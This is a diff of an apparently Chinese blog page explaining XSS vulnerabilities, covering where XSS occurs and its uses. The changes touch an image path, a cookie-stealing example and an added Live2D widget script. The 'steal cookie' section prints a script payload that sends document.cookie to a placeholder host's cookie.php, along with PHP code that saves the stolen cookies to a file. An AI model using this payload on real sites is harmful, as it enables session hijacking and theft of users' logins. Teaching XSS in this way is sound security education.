@@ -169,7 +169,7 @@
 <li>攻击者将恶意代码插入到服务器</li>
 <li>其他用户无防备的情况下访问服务器</li>
 <li>服务器将含有恶意代码的网页响应发送给客户端</li>
-<li>用户的客户端中执行了恶意代码<br><img src="/XSS%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/1.png" srcset="/img/loading.gif" alt></li>
+<li>用户的客户端中执行了恶意代码<br><img src="1.png" srcset="/img/loading.gif" alt=""></li>
 </ol>
 </li>
 <li><p><strong>可能存在XSS的地方</strong><br>留言板，聊天室，搜索等<br>如果用户的输入能在网页上显示，就很可能存在XSS<br>如果在URL中提交的参数值，在页面中显示，很有可能就存在XSS<br>如果在表单中提交的参数值，在页面中显示，很有可能就存在XSS<br>如果HTTP自定义头中提交的参数，在页面中显示，很有可能就存在XSS</p>
@@ -247,7 +247,7 @@
 <span class="hljs-built_in">window</span>.setTimeout(…)</code></pre>
 
 <h2 id="05-应用"><a href="#05-应用" class="headerlink" title="05 应用"></a>05 应用</h2><ol>
-<li><p><strong>盗取cookie</strong><br>&lt;script&gt;document.location=’<a href="http://ip/cookie.php？cookie=&#39;+document.cookie\" target="_blank" rel="noopener">http://ip/cookie.php？cookie=&#39;+document.cookie\</a><br>其中cookie.php为自己编写的接收cookie的代码</p>
+<li><p><strong>盗取cookie</strong><br>&lt;script&gt;document.location=’<a href="http://ip/cookie.php？cookie=&#39;+document.cookie\" target="_blank" rel="noopener">http://ip/cookie.php？cookie=&#39;+document.cookie\</a></script><br>其中cookie.php为自己编写的接收cookie的代码</p>
 <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
   $cookie=$_GET[<span class="hljs-string">'cookie'</span>];
 	file_put_contents(<span class="hljs-string">'cookie.txt'</span>,$cookie);
@@ -534,5 +534,5 @@
 
 
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
 </html>
